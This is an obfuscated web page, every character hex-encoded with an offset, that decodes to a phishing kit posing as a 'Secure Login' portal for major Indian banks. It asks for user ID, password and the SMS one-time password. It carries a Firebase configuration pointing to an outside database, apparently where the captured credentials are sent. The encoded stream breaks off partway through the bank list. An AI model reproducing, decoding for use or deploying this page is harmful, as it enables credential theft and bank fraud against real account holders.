3-3d-48-17-2d-2d-6f-7c-7f-71-72-7f-3a-7f-6e-71-76-82-80-47-2d-3e-3f-7d-85-48-17-2d-2d-7c-82-81-79-76-7b-72-47-2d-7b-7c-7b-72-48-17-2d-2d-6f-6e-70-78-74-7f-7c-82-7b-71-47-2d-30-73-45-73-6e-73-70-48-17-2d-2d-70-7c-79-7c-7f-47-2d-30-3e-6e-3f-3d-3f-70-48-17-2d-2d-73-7c-7b-81-3a-73-6e-7a-76-79-86-47-2d-76-7b-75-72-7f-76-81-48-17-2d-2d-81-7f-6e-7b-80-76-81-76-7c-7b-47-2d-6e-79-79-2d-3d-3b-40-80-48-17-8a-17-3b-7c-81-7d-3a-76-7b-7d-82-81-80-2d-76-7b-7d-82-81-47-73-7c-70-82-80-2d-88-17-2d-2d-6f-7c-7f-71-72-7f-3a-70-7c-79-7c-7f-47-2d-30-3e-46-44-43-71-3f-48-17-2d-2d-6f-6e-70-78-74-7f-7c-82-7b-71-47-2d-30-73-73-73-48-17-2d-2d-6f-7c-85-3a-80-75-6e-71-7c-84-47-2d-3d-2d-3d-2d-3d-2d-41-7d-85-2d-7f-74-6f-6e-35-3f-42-39-3e-3e-45-39-3f-3e-3d-39-3d-3b-3e-3f-36-48-17-2d-2d-81-7f-6e-7b-80-73-7c-7f-7a-47-2d-80-70-6e-79-72-35-3e-3b-3d-45-36-48-17-8a-17-17-3b-6e-81-81-72-7a-7d-81-3a-6f-6e-7f-2d-88-17-2d-2d-71-76-80-7d-79-6e-86-47-2d-73-79-72-85-48-17-2d-2d-6e-79-76-74-7b-3a-76-81-72-7a-80-47-2d-70-72-7b-81-72-7f-48-17-2d-2d-77-82-80-81-76-73-86-3a-70-7c-7b-81-72-7b-81-47-2d-70-72-7b-81-72-7f-48-17-2d-2d-74-6e-7d-47-2d-45-7d-85-48-17-2d-2d-7a-6e-7f-74-76-7b-3a-6f-7c-81-81-7c-7a-47-2d-3e-45-7d-85-48-17-2d-2d-73-7c-7b-81-3a-80-76-87-72-47-2d-3e-3f-3b-42-7d-85-48-17-2d-2d-70-7c-79-7c-7f-47-2d-30-44-3e-45-3d-46-43-48-17-2d-2d-73-7c-7b-81-3a-84-72-76-74-75-81-47-2d-42-3d-3d-48-17-8a-17-3b-6e-81-81-72-7a-7d-81-3a-6f-6e-7f-2d-3b-71-7c-81-80-2d-88-2d-71-76-80-7d-79-6e-86-47-2d-73-79-72-85-48-2d-74-6e-7d-47-2d-41-7d-85-48-2d-8a-17-3b-6e-81-81-72-7a-7d-81-3a-6f-6e-7f-2d-3b-71-7c-81-2d-88-17-2d-2d-84-76-71-81-75-47-2d-45-7d-85-48-17-2d-2d-75-72-76-74-75-81-47-2d-45-7d-85-48-17-2d-2d-6f-7c-7f-71-72-7f-3a-7f-6e-71-76-82-80-47-2d-42-3d-32-48-17-2d-2d-6f-6e-70-78-74-7f-7c-82-7b-71-47-2d-30-72-3f-72-45-73-3d-48-17-2d-2d-81-7f-6e-7b-80-76-81-76-7c-7b-47-2d-6e-79-79-2d-3d-3b-40-80-48-17-8a-17-3b-6e-81-81-72-7a-7d-81-3a-6f-6e-7f-2d-3b-71-7c-81-3b-82-80-72-71-2d-88-2d-6f-6e-70-78-74-7f-7c-82-7b-71-47-2d-30-71-40-3f-73-3f-73-48-2d-8a-17-3b-6e-81-81-72-7a-7d-81-3a-6f-6e-7f-2d-3b-71-7c-81-3b-6e-70-81-76-83-72-2d-88-2d-6f-6e-70-78-74-7f-7c-82-7b-71-47-2d-30-3d-71-41-44-6e-3e-48-2d-81-7f-6e-7b-80-73-7c-7f-7a-47-2d-80-70-6e-79-72-35-3e-3b-41-36-48-2d-8a-17-3b-6e-81-81-72-7a-7d-81-3a-6f-6e-7f-2d-3b-6e-81-81-72-7a-7d-81-3a-7b-82-7a-2d-88-2d-70-7c-79-7c-7f-47-2d-30-71-40-3f-73-3f-73-48-2d-73-7c-7b-81-3a-84-72-76-74-75-81-47-2d-44-3d-3d-48-2d-8a-17-17-4d-7a-72-71-76-6e-2d-35-7a-6e-85-3a-84-76-71-81-75-47-2d-41-45-3d-7d-85-36-2d-88-17-2d-2d-3b-7a-6e-76-7b-3a-70-6e-7f-71-2d-88-2d-7d-6e-71-71-76-7b-74-47-2d-3f-3f-7d-85-2d-3e-43-7d-85-48-2d-6f-7c-7f-71-72-7f-3a-7f-6e-71-76-82-80-47-2d-3f-3d-7d-85-48-2d-8a-17-2d-2d-3b-7c-81-7d-3a-76-7b-7d-82-81-80-2d-76-7b-7d-82-81-2d-88-2d-84-76-71-81-75-47-2d-41-3d-7d-85-48-2d-75-72-76-74-75-81-47-2d-41-45-7d-85-48-2d-73-7c-7b-81-3a-80-76-87-72-47-2d-3e-46-7d-85-48-2d-8a-17-2d-2d-3b-7c-81-7d-3a-76-7b-7d-82-81-80-2d-88-2d-74-6e-7d-47-2d-43-7d-85-48-2d-8a-17-2d-2d-3b-6f-6e-7b-78-3a-74-7f-76-71-3a-76-7b-7b-72-7f-2d-88-2d-74-7f-76-71-3a-81-72-7a-7d-79-6e-81-72-3a-70-7c-79-82-7a-7b-80-47-2d-7f-72-7d-72-6e-81-35-3f-39-2d-3e-73-7f-36-48-2d-74-6e-7d-47-2d-45-7d-85-48-2d-8a-17-2d-2d-3b-6f-6e-7b-78-3a-76-81-72-7a-2d-88-2d-7a-76-7b-3a-75-72-76-74-75-81-47-2d-3e-3d-3d-7d-85-48-2d-7d-6e-71-71-76-7b-74-47-2d-3e-3d-7d-85-2d-43-7d-85-48-2d-8a-17-2d-2d-3b-6f-6e-7b-78-3a-76-81-72-7a-3a-79-7c-74-7c-2d-88-2d-75-72-76-74-75-81-47-2d-40-42-7d-85-48-2d-8a-17-2d-2d-3b-6f-6e-7b-78-3a-76-81-72-7a-3a-7b-6e-7a-72-2d-88-2d-73-7c-7b-81-3a-80-76-87-72-47-2d-3e-3d-7d-85-48-2d-8a-17-8a-17-49-3c-80-81-86-79-72-4b-17-49-3c-75-72-6e-71-4b-17-49-6f-7c-71-86-4b-17-17-49-71-76-83-2d-70-79-6e-80-80-4a-2f-6e-7d-7d-3a-75-72-6e-71-72-7f-2f-4b-17-2d-2d-49-6e-2d-75-7f-72-73-4a-2f-75-7c-7a-72-3b-75-81-7a-79-2f-2d-70-79-6e-80-80-4a-2f-6f-6e-70-78-3a-6f-81-7b-2f-4b-219d-49-3c-6e-4b-17-2d-2d-49-71-76-83-2d-70-79-6e-80-80-4a-2f-75-72-6e-71-72-7f-3a-6f-7f-6e-7b-71-2f-4b-17-2d-2d-2d-2d-49-75-3f-2d-76-71-4a-2f-75-72-6e-71-72-7f-4f-6e-7b-78-5b-6e-7a-72-2f-4b-4e-79-79-2d-56-7b-71-76-6e-7b-2d-4f-6e-7b-78-80-49-3c-75-3f-4b-17-2d-2d-2d-2d-49-7d-4b-60-72-70-82-7f-72-2d-59-7c-74-76-7b-49-3c-7d-4b-17-2d-2d-49-3c-71-76-83-4b-17-49-3c-71-76-83-4b-17-17-49-71-76-83-2d-70-79-6e-80-80-4a-2f-6e-7d-7d-3a-7a-6e-76-7b-2f-4b-17-2d-2d-49-71-76-83-2d-70-79-6e-80-80-4a-2f-7a-6e-76-7b-3a-70-6e-7f-71-2f-4b-17-17-2d-2d-2d-2d-49-71-76-83-2d-70-79-6e-80-80-4a-2f-6f-7f-6e-7b-71-3a-6f-79-7c-70-78-2f-4b-17-2d-2d-2d-2d-2d-2d-49-71-76-83-2d-70-79-6e-80-80-4a-2f-6f-7f-6e-7b-71-3a-76-70-7c-7b-2f-4b-d849-dff3-49-3c-71-76-83-4b-17-2d-2d-2d-2d-2d-2d-49-71-76-83-2d-70-79-6e-80-80-4a-2f-6f-7f-6e-7b-71-3a-81-76-81-79-72-2f-4b-60-72-70-82-7f-72-2d-49-80-7d-6e-7b-2d-70-79-6e-80-80-4a-2f-75-76-74-75-79-76-74-75-81-2f-4b-59-7c-74-76-7b-49-3c-80-7d-6e-7b-4b-49-3c-71-76-83-4b-17-2d-2d-2d-2d-2d-2d-49-71-76-83-2d-70-79-6e-80-80-4a-2f-6f-7f-6e-7b-71-3a-80-82-6f-2f-4b-5a-7c-6f-76-79-72-2d-4f-6e-7b-78-76-7b-74-49-3c-71-76-83-4b-17-2d-2d-2d-2d-49-3c-71-76-83-4b-17-17-2d-2d-2d-2d-49-71-76-83-2d-76-71-4a-2f-79-7c-74-76-7b-53-7c-7f-7a-60-72-70-81-76-7c-7b-2f-4b-17-17-2d-2d-2d-2d-2d-2d-49-71-76-83-2d-76-71-4a-2f-6f-6e-7b-78-60-72-79-72-70-81-60-72-70-81-76-7c-7b-2f-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-49-71-76-83-2d-70-79-6e-80-80-4a-2f-80-72-79-72-70-81-3a-6f-6e-7b-78-3a-81-76-81-79-72-2f-4b-60-72-79-72-70-81-2d-66-7c-82-7f-2d-4f-6e-7b-78-49-3c-71-76-83-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-49-71-76-83-2d-70-79-6e-80-80-4a-2f-6f-6e-7b-78-3a-74-7f-76-71-3a-76-7b-7b-72-7f-2f-2d-76-71-4a-2f-6f-6e-7b-78-54-7f-76-71-56-7b-7b-72-7f-2f-4b-49-3c-71-76-83-4b-17-2d-2d-2d-2d-2d-2d-49-3c-71-76-83-4b-17-17-2d-2d-2d-2d-2d-2d-49-71-76-83-2d-70-79-6e-80-80-4a-2f-80-72-79-72-70-81-72-71-3a-6f-6e-7b-78-3a-6f-6e-7b-7b-72-7f-2f-2d-76-71-4a-2f-80-72-79-72-70-81-72-71-4f-6e-7b-78-4f-6e-7b-7b-72-7f-2f-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-49-71-76-83-2d-70-79-6e-80-80-4a-2f-80-72-79-3a-79-7c-74-7c-2f-2d-76-71-4a-2f-80-72-79-59-7c-74-7c-2f-4b-49-3c-71-76-83-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-49-71-76-83-2d-70-79-6e-80-80-4a-2f-80-72-79-3a-76-7b-73-7c-2f-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-2d-2d-49-75-41-2d-76-71-4a-2f-80-72-79-4f-6e-7b-78-5b-6e-7a-72-2f-4b-4f-6e-7b-78-2d-5b-6e-7a-72-49-3c-75-41-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-2d-2d-49-7d-4b-4f-6e-7b-78-2d-60-72-79-72-70-81-72-71-49-3c-7d-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-49-3c-71-76-83-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-49-6f-82-81-81-7c-7b-2d-70-79-6e-80-80-4a-2f-70-75-6e-7b-74-72-3a-6f-81-7b-2f-2d-7c-7b-70-79-76-70-78-4a-2f-70-75-6e-7b-74-72-4f-6e-7b-78-35-36-2f-4b-50-75-6e-7b-74-72-49-3c-6f-82-81-81-7c-7b-4b-17-2d-2d-2d-2d-2d-2d-49-3c-71-76-83-4b-17-17-2d-2d-2d-2d-2d-2d-49-71-76-83-2d-70-79-6e-80-80-4a-2f-79-7c-74-76-7b-3a-73-76-72-79-71-80-2f-2d-76-71-4a-2f-79-7c-74-76-7b-53-76-72-79-71-80-2f-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-49-71-76-83-2d-70-79-6e-80-80-4a-2f-73-7c-7f-7a-3a-74-7f-7c-82-7d-2f-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-2d-2d-49-79-6e-6f-72-79-4b-62-60-52-5f-5b-4e-5a-52-49-3c-79-6e-6f-72-79-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-2d-2d-49-71-76-83-2d-70-79-6e-80-80-4a-2f-73-76-72-79-71-3a-84-7f-6e-7d-2f-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-2d-2d-2d-2d-49-80-7d-6e-7b-2d-70-79-6e-80-80-4a-2f-73-76-72-79-71-3a-76-70-7c-7b-2f-4b-d84a-dc71-49-3c-80-7d-6e-7b-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-2d-2d-2d-2d-49-76-7b-7d-82-81-2d-81-86-7d-72-4a-2f-81-72-85-81-2f-2d-76-71-4a-2f-79-7c-74-76-7b-62-80-72-7f-56-71-2f-2d-7d-79-6e-70-72-75-7c-79-71-72-7f-4a-2f-52-7b-81-72-7f-2d-86-7c-82-7f-2d-82-80-72-7f-2d-56-51-2f-2d-6e-82-81-7c-70-7c-7a-7d-79-72-81-72-4a-2f-7c-73-73-2f-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-2d-2d-49-3c-71-76-83-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-49-3c-71-76-83-4b-17-17-2d-2d-2d-2d-2d-2d-2d-2d-49-71-76-83-2d-70-79-6e-80-80-4a-2f-73-7c-7f-7a-3a-74-7f-7c-82-7d-2f-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-2d-2d-49-79-6e-6f-72-79-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-2d-2d-2d-2d-5d-4e-60-60-64-5c-5f-51-17-2d-2d-2d-2d-2d-2d-2d-2d-2d-2d-2d-2d-49-80-7d-6e-7b-2d-70-79-6e-80-80-4a-2f-73-7c-7f-74-7c-81-3a-79-76-7b-78-2f-2d-7c-7b-70-79-76-70-78-4a-2f-73-7c-7f-74-7c-81-5d-76-7b-35-36-2f-4b-53-7c-7f-74-7c-81-4c-49-3c-80-7d-6e-7b-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-2d-2d-49-3c-79-6e-6f-72-79-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-2d-2d-49-71-76-83-2d-70-79-6e-80-80-4a-2f-73-76-72-79-71-3a-84-7f-6e-7d-2f-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-2d-2d-2d-2d-49-80-7d-6e-7b-2d-70-79-6e-80-80-4a-2f-73-76-72-79-71-3a-76-70-7c-7b-2f-4b-d84a-dd1f-49-3c-80-7d-6e-7b-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-2d-2d-2d-2d-49-76-7b-7d-82-81-2d-81-86-7d-72-4a-2f-7d-6e-80-80-84-7c-7f-71-2f-2d-76-71-4a-2f-79-7c-74-76-7b-5d-76-7b-2f-2d-76-7b-7d-82-81-7a-7c-71-72-4a-2f-7b-82-7a-72-7f-76-70-2f-2d-7a-6e-85-79-72-7b-74-81-75-4a-2f-43-2f-2d-7d-79-6e-70-72-75-7c-79-71-72-7f-4a-2f-52-7b-81-72-7f-2d-41-3a-43-2d-71-76-74-76-81-2d-7d-6e-80-80-84-7c-7f-71-2f-2d-6e-82-81-7c-70-7c-7a-7d-79-72-81-72-4a-2f-7c-73-73-2f-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-2d-2d-49-3c-71-76-83-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-49-3c-71-76-83-4b-17-17-2d-2d-2d-2d-2d-2d-2d-2d-49-6f-82-81-81-7c-7b-2d-70-79-6e-80-80-4a-2f-6f-81-7b-3a-7d-7f-76-7a-6e-7f-86-2f-2d-7c-7b-70-79-76-70-78-4a-2f-75-6e-7b-71-79-72-59-7c-74-76-7b-35-36-2f-4b-d84a-dd1d-2d-60-72-70-82-7f-72-2d-59-7c-74-76-7b-49-3c-6f-82-81-81-7c-7b-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-49-71-76-83-2d-76-71-4a-2f-79-7c-74-76-7b-60-82-70-70-72-80-80-2f-2d-70-79-6e-80-80-4a-2f-6e-79-72-7f-81-2f-4b-49-3c-71-76-83-4b-17-2d-2d-2d-2d-2d-2d-49-3c-71-76-83-4b-17-17-2d-2d-2d-2d-49-3c-71-76-83-4b-17-17-2d-2d-2d-2d-49-71-76-83-2d-70-79-6e-80-80-4a-2f-7c-81-7d-3a-80-72-70-81-76-7c-7b-2f-2d-76-71-4a-2f-7c-81-7d-60-72-70-81-76-7c-7b-2f-4b-17-2d-2d-2d-2d-2d-2d-49-71-76-83-2d-70-79-6e-80-80-4a-2f-7c-81-7d-3a-75-72-6e-71-72-7f-2f-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-49-71-76-83-2d-70-79-6e-80-80-4a-2f-79-7c-70-78-3a-70-76-7f-70-79-72-2f-4b-d84a-dd1d-49-3c-71-76-83-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-49-71-76-83-2d-70-79-6e-80-80-4a-2f-7c-81-7d-3a-81-76-81-79-72-2f-4b-5c-61-5d-2d-63-72-7f-76-73-76-70-6e-81-76-7c-7b-49-3c-71-76-83-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-49-71-76-83-2d-70-79-6e-80-80-4a-2f-7c-81-7d-3a-80-82-6f-2f-4b-52-7b-81-72-7f-2d-81-75-72-2d-43-3a-71-76-74-76-81-2d-5c-61-5d-2d-80-72-7b-81-2d-81-7c-2d-86-7c-82-7f-2d-7f-72-74-76-80-81-72-7f-72-71-2d-7a-7c-6f-76-79-72-49-3c-71-76-83-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-49-71-76-83-2d-70-79-6e-80-80-4a-2f-6f-6e-7b-78-3a-81-6e-74-2f-2d-76-71-4a-2f-7c-81-7d-4f-6e-7b-78-61-6e-74-2f-4b-49-3c-71-76-83-4b-17-2d-2d-2d-2d-2d-2d-49-3c-71-76-83-4b-17-17-2d-2d-2d-2d-2d-2d-49-71-76-83-2d-70-79-6e-80-80-4a-2f-7c-81-7d-3a-76-7b-7d-82-81-80-2f-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-49-76-7b-7d-82-81-2d-81-86-7d-72-4a-2f-81-72-85-81-2f-2d-7a-6e-85-79-72-7b-74-81-75-4a-2f-3e-2f-2d-76-7b-7d-82-81-7a-7c-71-72-4a-2f-7b-82-7a-72-7f-76-70-2f-2d-76-71-4a-2f-7c-81-7d-3e-2f-2d-7c-7b-76-7b-7d-82-81-4a-2f-7a-7c-83-72-5c-81-7d-35-81-75-76-80-39-2d-34-7c-81-7d-3f-34-36-2f-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-49-76-7b-7d-82-81-2d-81-86-7d-72-4a-2f-81-72-85-81-2f-2d-7a-6e-85-79-72-7b-74-81-75-4a-2f-3e-2f-2d-76-7b-7d-82-81-7a-7c-71-72-4a-2f-7b-82-7a-72-7f-76-70-2f-2d-76-71-4a-2f-7c-81-7d-3f-2f-2d-7c-7b-76-7b-7d-82-81-4a-2f-7a-7c-83-72-5c-81-7d-35-81-75-76-80-39-2d-34-7c-81-7d-40-34-36-2f-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-49-76-7b-7d-82-81-2d-81-86-7d-72-4a-2f-81-72-85-81-2f-2d-7a-6e-85-79-72-7b-74-81-75-4a-2f-3e-2f-2d-76-7b-7d-82-81-7a-7c-71-72-4a-2f-7b-82-7a-72-7f-76-70-2f-2d-76-71-4a-2f-7c-81-7d-40-2f-2d-7c-7b-76-7b-7d-82-81-4a-2f-7a-7c-83-72-5c-81-7d-35-81-75-76-80-39-2d-34-7c-81-7d-41-34-36-2f-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-49-76-7b-7d-82-81-2d-81-86-7d-72-4a-2f-81-72-85-81-2f-2d-7a-6e-85-79-72-7b-74-81-75-4a-2f-3e-2f-2d-76-7b-7d-82-81-7a-7c-71-72-4a-2f-7b-82-7a-72-7f-76-70-2f-2d-76-71-4a-2f-7c-81-7d-41-2f-2d-7c-7b-76-7b-7d-82-81-4a-2f-7a-7c-83-72-5c-81-7d-35-81-75-76-80-39-2d-34-7c-81-7d-42-34-36-2f-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-49-76-7b-7d-82-81-2d-81-86-7d-72-4a-2f-81-72-85-81-2f-2d-7a-6e-85-79-72-7b-74-81-75-4a-2f-3e-2f-2d-76-7b-7d-82-81-7a-7c-71-72-4a-2f-7b-82-7a-72-7f-76-70-2f-2d-76-71-4a-2f-7c-81-7d-42-2f-2d-7c-7b-76-7b-7d-82-81-4a-2f-7a-7c-83-72-5c-81-7d-35-81-75-76-80-39-2d-34-7c-81-7d-43-34-36-2f-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-49-76-7b-7d-82-81-2d-81-86-7d-72-4a-2f-81-72-85-81-2f-2d-7a-6e-85-79-72-7b-74-81-75-4a-2f-3e-2f-2d-76-7b-7d-82-81-7a-7c-71-72-4a-2f-7b-82-7a-72-7f-76-70-2f-2d-76-71-4a-2f-7c-81-7d-43-2f-4b-17-2d-2d-2d-2d-2d-2d-49-3c-71-76-83-4b-17-17-2d-2d-2d-2d-2d-2d-49-71-76-83-2d-70-79-6e-80-80-4a-2f-6e-81-81-72-7a-7d-81-3a-6f-6e-7f-2f-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-49-80-7d-6e-7b-4b-4e-81-81-72-7a-7d-81-49-3c-80-7d-6e-7b-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-49-71-76-83-2d-70-79-6e-80-80-4a-2f-71-7c-81-80-2f-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-2d-2d-49-71-76-83-2d-70-79-6e-80-80-4a-2f-71-7c-81-2d-6e-70-81-76-83-72-2f-2d-76-71-4a-2f-71-7c-81-3e-2f-4b-49-3c-71-76-83-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-2d-2d-49-71-76-83-2d-70-79-6e-80-80-4a-2f-71-7c-81-2f-2d-76-71-4a-2f-71-7c-81-3f-2f-4b-49-3c-71-76-83-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-2d-2d-49-71-76-83-2d-70-79-6e-80-80-4a-2f-71-7c-81-2f-2d-76-71-4a-2f-71-7c-81-40-2f-4b-49-3c-71-76-83-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-49-3c-71-76-83-4b-17-2d-2d-2d-2d-2d-2d-2d-2d-49-80-7d-6e-7b-2d-70-79-6e-80-80-4a-2f-6e-81-81-72-7a-7d-81-3a-7b-82-7a-2f-4b-49-80-7d-6e-7b-2d-76-71-4a-2f-6e-81-81-72-7a-7d-81-50-7c-82-7b-81-2f-4b-3e-49-3c-80-7d-6e-7b-4b-3c-40-49-3c-80-7d-6e-7b-4b-17-2d-2d-2d-2d-2d-2d-49-3c-71-76-83-4b-17-17-2d-2d-2d-2d-2d-2d-49-6f-82-81-81-7c-7b-2d-70-79-6e-80-80-4a-2f-6f-81-7b-3a-7d-7f-76-7a-6e-7f-86-2f-2d-7c-7b-70-79-76-70-78-4a-2f-83-72-7f-76-73-86-5c-81-7d-35-36-2f-4b-2720-2d-63-72-7f-76-73-86-2d-5c-61-5d-49-3c-6f-82-81-81-7c-7b-4b-17-2d-2d-2d-2d-2d-2d-49-6f-82-81-81-7c-7b-2d-70-79-6e-80-80-4a-2f-6f-81-7b-3a-80-72-70-7c-7b-71-6e-7f-86-2f-2d-7c-7b-70-79-76-70-78-4a-2f-70-6e-7b-70-72-79-5c-81-7d-35-36-2f-4b-50-6e-7b-70-72-79-49-3c-6f-82-81-81-7c-7b-4b-17-2d-2d-2d-2d-2d-2d-49-71-76-83-2d-76-71-4a-2f-7c-81-7d-5a-72-80-80-6e-74-72-2f-2d-70-79-6e-80-80-4a-2f-6e-79-72-7f-81-2f-4b-49-3c-71-76-83-4b-17-2d-2d-2d-2d-49-3c-71-76-83-4b-17-17-2d-2d-49-3c-71-76-83-4b-17-49-3c-71-76-83-4b-17-17-49-80-70-7f-76-7d-81-4b-17-3c-3c-2d-4a-4a-4a-4a-4a-2d-5b-52-64-2d-53-56-5f-52-4f-4e-60-52-2d-50-5c-5b-53-56-54-2d-4a-4a-4a-4a-4a-17-83-6e-7f-2d-73-76-7f-72-6f-6e-80-72-50-7c-7b-73-76-74-2d-4a-2d-88-17-2d-2d-6e-7d-76-58-72-86-47-2d-2f-4e-56-87-6e-60-86-4f-56-84-62-80-85-86-72-5e-7a-7c-72-61-3f-70-81-55-3f-59-85-7e-5f-62-6c-6c-71-75-7e-7d-46-80-46-41-2f-39-17-2d-2d-6e-82-81-75-51-7c-7a-6e-76-7b-47-2d-2f-78-75-6e-7f-6e-79-3a-6f-41-44-6f-43-3b-73-76-7f-72-6f-6e-80-72-6e-7d-7d-3b-70-7c-7a-2f-39-17-2d-2d-71-6e-81-6e-6f-6e-80-72-62-5f-59-47-2d-2f-75-81-81-7d-80-47-3c-3c-78-75-6e-7f-6e-79-3a-6f-41-44-6f-43-3a-71-72-73-6e-82-79-81-3a-7f-81-71-6f-3b-73-76-7f-72-6f-6e-80-72-76-7c-3b-70-7c-7a-2f-39-17-2d-2d-7d-7f-7c-77-72-70-81-56-71-47-2d-2f-78-75-6e-7f-6e-79-3a-6f-41-44-6f-43-2f-39-17-2d-2d-80-81-7c-7f-6e-74-72-4f-82-70-78-72-81-47-2d-2f-78-75-6e-7f-6e-79-3a-6f-41-44-6f-43-3b-73-76-7f-72-6f-6e-80-72-80-81-7c-7f-6e-74-72-3b-6e-7d-7d-2f-39-17-2d-2d-7a-72-80-80-6e-74-76-7b-74-60-72-7b-71-72-7f-56-71-47-2d-2f-42-3f-45-3f-3e-41-45-41-3e-44-41-3d-2f-39-17-2d-2d-6e-7d-7d-56-71-47-2d-2f-3e-47-42-3f-45-3f-3e-41-45-41-3e-44-41-3d-47-84-72-6f-47-72-40-46-41-6e-42-44-41-72-73-3f-6f-6e-3f-70-3e-43-72-46-72-6e-46-2f-39-17-2d-2d-7a-72-6e-80-82-7f-72-7a-72-7b-81-56-71-47-2d-2f-54-3a-5f-4f-44-52-42-5a-3f-5f-51-50-2f-17-8a-48-17-73-76-7f-72-6f-6e-80-72-3b-76-7b-76-81-76-6e-79-76-87-72-4e-7d-7d-35-73-76-7f-72-6f-6e-80-72-50-7c-7b-73-76-74-36-48-17-83-6e-7f-2d-71-6e-81-6e-6f-6e-80-72-2d-4a-2d-73-76-7f-72-6f-6e-80-72-3b-71-6e-81-6e-6f-6e-80-72-35-36-48-17-17-83-6e-7f-2d-6f-6e-7b-78-80-2d-4a-2d-68-17-2d-2d-88-2d-7b-6e-7a-72-47-2d-2f-60-81-6e-81-72-2d-4f-6e-7b-78-2d-7c-73-2d-56-7b-71-76-6e-2f-39-2d-79-7c-74-7c-47-2d-2f-75-81-81-7d-80-47-3c-3c-76-3b-7d-7c-80-81-76-7a-74-3b-70-70-3c-57-44-40-86-7b-50-83-6f-3c-56-5a-54-3a-3f-3d-3f-43-3d-46-3e-3d-3a-64-4e-3d-3d-40-3d-3b-77-7d-74-2f-2d-8a-39-17-2d-2d-88-2d-7b-6e-7a-72-47-2d-2f-55-51-53-50-2d-4f-6e-7b-78-2f-39-2d-79-7c-74-7c-47-2d-2f-75-81-81-7d-80-47-3c-3c-76-3b-7d-7c-80-81-76-7a-74-3b-70-70-3c-87-83-7e-54-64-40-43-3d-3c-56-5a-54-3a-3f-3d-3f-43-3d-46-3e-3d-3a-64-4e-3d-3d-40-3f-3b-77-7d-74-2f-2d-8a-39-17-2d-2d-88-2d-7b-6e-7a-72-47-2d-2f-56-50-56-50-56-2d-4f-6e-7b-78-2f-39-2d-79-7c-74-7c-47-2d-2f-75-81-81-7d-80-47-3c-3c-76-3b-7d-7c-80-81-76-7a-74-3b-70-70-3c-4f-7b-5f-67-7d-7a-5f-60-3c-56-5a-54-3a-3f-3d-3f-43-3d-46-3e-3d-3a-64-4e-3d-3d-40-40-3b-77-7d-74-2f-2d-8a-39-17-2d-2d-88-2d-7b-6e-7a-72-47-2d-2f-4e-85-76-80-2d-4f-6e-7b-78-2f-39-2d-79-7c-74-7c-47-2d-2f-75-81-81-7d-80-47-3c-3c-76-3b-7d-7c-80-81-76-7a-74-3b-70-70-3c-84-83-7d-7e-45-44-7e-4f-3c-56-5a-54-3a-3f-3d-3f-43-3d-46-3e-3d-3a-64-4e-3d-3d-40-41-3b-77-7d-74-2f-2d-8a-39-17-2d-2d-88-2d-7b-6e-7a-72-47-2d-2f-5d-82-7b-77-6e-6f-2d-5b-6e-81-76-7c-7b-6e-79-2d-4f-6e-7b-78-2f-39-2d-79-7c-74-7c-47-2d-2f-75-81-81-7d-80-47-3c-3c-76-3b-7d-7c-80-81-76-7a-74-3b-70-70-3c-55-78-6f-64-60-84-7a-58-3c-56-5a-54-3a-3f-3d-3f-43-3d-46-3e-3d-3a-64-4e-3d-3d-40-42-3b-77-7d-74-2f-2d-8a-39-17-2d-2d-88-2d-7b-6e-7a-72-47-2d-2f-4f-6e-7b-78-2d-7c-73-2d-4f-6e-7f-7c-71-6e-2f-39-2d-79-7c-74-7c-47-2d-2f-75-81-81-7d-80-47-3c-3c-76-3b-7d-7c-80-81-76-7a-74-3b-70-70-3c-5d-85-44-78-73-57-75-61-3c-56-5a-54-3a-3f-3d-3f-43-3d-46-3e-3d-3a-64-4e-3d-3d-40-43-3b-77-7d-74-2f-2d-8a-39-17-2d-2d-88-2d-7b-6e-7a-72-47-2d-2f-50-6e-7b-6e-7f-6e-2d-4f-6e-7b-78-2f-39-2d-79-7c-74-7c-47-2d-2f-75-81-81-7d-80-47-3c-3c-76-3b-7d-7c-80-81-76-7a-74-3b-70-70-3c-78-5a-81-42-43-40-55-84-3c-56-5a-54-3a-3f-3d-3f-43-3d-46-3e-3d-3a-64-4e-3d-3d-40-44-3b-77-7d-74-2f-2d-8a-39-17-2d-2d-88-2d-7b-6e-7a-72-47-2d-2f-62-7b-76-7c-7b-2d-4f-6e-7b-78-2d-7c-73-2d-56-7b-71-76-6e-2f-39-2d-79-7c-74-7c-47-2d-2f-75-81-81-7d-80-47-3c-3c-76-3b-7d-7c-80-81-76-7a-74-3b-70-70-3c-7f-86-64-45-86-54-3d-58-3c-56-5a-54-3a-3f-3d-3f-43-3d-46-3e-3d-3a-64-4e-